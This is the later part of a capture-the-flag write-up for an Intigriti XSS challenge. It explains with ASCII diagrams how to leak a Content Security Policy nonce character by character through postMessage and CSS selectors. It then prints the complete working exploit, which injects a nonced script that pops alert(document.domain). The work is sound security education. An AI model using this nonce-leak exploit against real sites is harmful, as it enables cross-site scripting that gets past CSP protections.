|   challenge-0922.intigriti.com/challenge/index.php                  |
|  +---------------------------------------------------------------+  |
|  |                                                               |  |
|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0             |  |
|  |  +------------------------------------------------+           |  |
|  |  |                                                |           |  |
|  |  |                                                |           |  |
|  |  |   code sends new iteration of nonce            |           |  |
|  |  |   every 100ms to parent via postMessage +------------->    |  |
|  |  |                                                |           |  |
|  |  +------------------------------------------------+           |  |
|  +---------------------------------------------------------------+  |
+---------------------------------------------------------------------+
```
On every message `index.php` receives it does the `document.querySelector`
call which includes the sent nonce.
```
  editor.43z.one/1337
+----------------------------------------------------------------------------------------+
|                                                                                        |
|   challenge-0922.intigriti.com/challenge/index.php                                     |
|  +--------------------------------------------------------------------------+          |
|  |                                                                          |          |
|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0  <---+                 |          |
|  |  +------------------------------------------------+    |                 |          |
|  |  |                                                |    |                 |          |
|  |  |                                                |    +                 |          |
|  |  |   code detects beforeunload event              | when nonce matches it|          |
|  |  |   sends the last nonce it sent to parent       | will set the src     |          |
|  |  |   now to top                                   | of inner iframe to   |          |
|  |  |      +                                         | challenge-0922.intigriti.com    |
|  |  |      |                                         |                      |          |
|  |  |      |                                         |                      |          |
|  |  +------------------------------------------------+                      |          |
|  |         |                                                                |          |
|  +--------------------------------------------------------------------------+          |
|            |                                                                           |
|            v                                                                           |
+----------------------------------------------------------------------------------------+
```
The top has now the first character of the nonce. And the whole process
starts again. But this time the blob code starts the iteration from with the new
nonce that just matched.

We will do this again and again and build up the nonce character by character.
It's tricky to detect the when we got the full nonce because it has not a fixed
length. It can be from 29 up to 32 characters long. We will have to make use
of some timeout counter and simply define that if we don't get a message in the
`top` from the blob in 2 seconds it means we already have the full nonce.

And when that happens we can finally do what failed before. Create a new blob,
one last time, that sends the 'set' message which changes the 'srcdoc' of the iframe.
But this time we got the nonce to make the Content Security Policy happy.

```
<iframe onload=stage1() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  onmessage = e => {
    // here detecting the progress of the nonce
    if(nonce fully extracted){
      stage2(nonce)
    }
  }
  stage1 = e => {
    // here the nonce exfiltration stuff
  }

  stage2 = nonce => {
    burl = URL.createObjectURL(new Blob([`
      <script>
        parent.postMessage({
          element: '#ball',
          action: 'set',
          attr: 'srcdoc',
          // we have to use parent.alert because iframe 
          // has sandbox value set and does not allow modals
          // alternatively we could make use of `removeAttribute` to delete it
          value: '<script nonce=${nonce}>parent.alert(document.domain)</'+'script>'
        }, '*') 
      <\/script>
    `], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```
And here is the final exploit with all the glue code added to make it actually work.
https://editor.43z.one/j91ak/i check the console to see progress
```
<iframe onload="stage1('')" src="https://challenge-0922.intigriti.io/challenge/"></iframe>

<script>
  const sleepTime = 100
  finished = null
  listener = e => {
    if(!e.data.length) return

    clearTimeout(finished)
    nonce=e.data

    finished = setTimeout(_=>{
      console.log('probabbly finished with', nonce)
      stage2(nonce)
      removeEventListener('message', listener)
    }, sleepTime*17)

    stage1(nonce)

  }
  addEventListener('message', listener)

  genblob = content => {
    b = new Blob([`<script>${content}<\/script>`],{type: 'text/html'})
    return URL.createObjectURL(b)
  }

  stage1 = nonce => {
    frames[0][0].location = genblob(`
      sleep = ms => new Promise(r => setTimeout(r, ms))
      checkNonce=null

      listener = e =>{
        top.postMessage(checkNonce+'', '*')
        removeEventListener('beforeunload', listener)
      }
      addEventListener('beforeunload', listener)

      iteratenonce = async (partialNonce) => {
        console.log('iterating nonce starting with','${nonce}')
        chars = ['a','b','c','d','e','f','0','1','2','3','4','5','6','7','8','9']
        for(ix=0; ix<chars.length;ix++){
          checkNonce = partialNonce+chars[ix]
          action = {
            element: 'script[nonce^="'+checkNonce+'"]~div>div>iframe',
            action: 'set',
            attr: 'src',
            value: 'https://challenge-0922.intigriti.io'
          }
          parent.postMessage(action, '*')
          console.log('checking', checkNonce)
          await sleep('${sleepTime}')
        }
      }
      iteratenonce('${nonce}')
    `)
  }

  stage2 = nonce => {
    console.log('send script to pop with nonce', nonce)
    frames[0][0].location = genblob(`
      parent.postMessage({
        element: '#ball',
        action: 'set',
        attr: 'srcdoc',
        value: '<script nonce="${nonce}">parent.alert(document.domain)<\\/script>'
      }, '*')
    `)
  }
</script>
```

This was a long journey! You can shoot me a message [@h43z](https://twitter.com/h43z) or open a PR if 
you have any questions.
